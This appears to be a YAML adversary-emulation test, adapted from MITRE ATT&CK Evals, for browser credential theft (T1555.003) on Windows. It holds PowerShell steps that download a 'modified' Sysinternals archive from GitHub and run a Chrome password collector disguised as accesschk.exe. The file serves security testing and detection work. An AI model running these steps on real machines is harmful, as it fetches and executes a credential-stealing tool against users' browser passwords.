api_version: "2.0"
name: Run Chrome-password Collector
description: |
    A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.

    Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of PathToAtomicsFolder\..\ExternalPayloads\sysinternals\passwordsdb.

    Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
args:
    - name: file_path
      type: string
      default: PathToAtomicsFolder\..\ExternalPayloads
uuid: 8c05b133-d438-47ca-a630-19cc464c4622
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1555: Credentials from Password Stores'
    subtechniques:
        - 'T1555.003: Credentials from Web Browsers'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Modified Sysinternals must be located at #{file_path}
      inline: |
        if (Test-Path "#{file_path}\SysInternals") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
        Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
        Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
        }}
      executor: powershell
    - name: run-chrome-password-collector
      inline: |
        Set-Location -path "{{.Args.file_path}}\Sysinternals";
        ./accesschk.exe -accepteula .;
      executor: powershell
      cleanup:
        inline: |
            Remove-Item "{{.Args.file_path}}\Sysinternals" -Force -Recurse -ErrorAction Ignore
        executor: powershell
